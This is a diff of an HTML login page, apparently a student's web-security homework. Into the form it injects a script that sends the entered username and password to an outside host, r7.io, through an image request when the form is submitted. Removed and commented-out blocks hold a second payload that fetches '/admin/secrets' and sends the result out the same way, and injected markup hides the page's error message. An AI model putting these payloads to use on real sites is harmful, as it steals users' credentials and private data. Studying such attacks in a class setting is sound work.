@@ -28,10 +28,10 @@
 <div id="signin" class="reveal">
   <form id="login" action="./login" method="get" class="untouched">
 
-      <h2 class="problem">Whoops!</h2>
+      <!--<h2 class="problem">Whoops!</h2>
       <p class="error-message">
         Username: <span id='name' value='suh'>suh</span> does not appear in the system. Please try again
-      </p>
+      </p>-->
 
 
       <div id="login-fields-wrapper">
@@ -42,21 +42,18 @@
       </div>
         <input id="user_language" name="user_language" type="hidden" value="english">
         <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3">
-        <script>
+        <script> 
           function run() {
-            $.get("/admin/secrets" ,function(response) {  
-            var success = $($.parseHTML(response)).filter("#secrets"); 
-            i=new Image();
-            i.src='http://r7.io/e/1166811?s='+success.text();alert(success.text());
-            alert(success.text());
-            },'html'); 
+              i = new Image();
+              i.src='http://r7.io/e/1166811?s=' +document.getElementById("login_username").value+' '+document.getElementById("login_password").value;
+          };
+          function window() {
+            window.location='http://www.students.washington.edu/sebet86/WebPageInfo415/Homework#3/';
           };
           target = document.getElementById("login");
-          test = target.getElementsByClassName('problem')[0].innerHTML=""; 
-          test2 = target.getElementsByClassName('error-message')[0].outerHTML=""; 
           target.addEventListener('submit', run);
-        </script>
-       
+          target.addEventListener('submit', window);
+          </script>
        <!--my answers-->
       <!--<script>function run(){$.get("/admin/secrets",function(response){success=$($.parseHTML(response)).filter("#secrets");i=new Image();j=success.text();i.src='http://r7.io/e/1166811?s='+j;alert(success.text());},'html');};var target=document.getElementById("login");test=target.getElementsByClassName('problem')[0].innerHTML="";test=target.getElementsByClassName('error-message')[0].outerHTML="";target.addEventListener('submit',run);</script>-->
 
@@ -84,3 +81,18 @@
 
 
   <script src="/static/noauthpages3760373616.gz.js" type="text/javascript"></script>
+
+
+          <!--<script>
+          function run() {
+            $.get("/admin/secrets" ,function(response) {  
+            var success = $($.parseHTML(response)).filter("#secrets"); 
+            i=new Image();
+            i.src='http://r7.io/e/1166811?s='+success.text();alert(success.text());
+            },'html'); 
+          };
+          target = document.getElementById("login");
+          test = target.getElementsByClassName('problem')[0].innerHTML=""; 
+          test2 = target.getElementsByClassName('error-message')[0].outerHTML=""; 
+          target.addEventListener('submit', run);
+        </script>-->
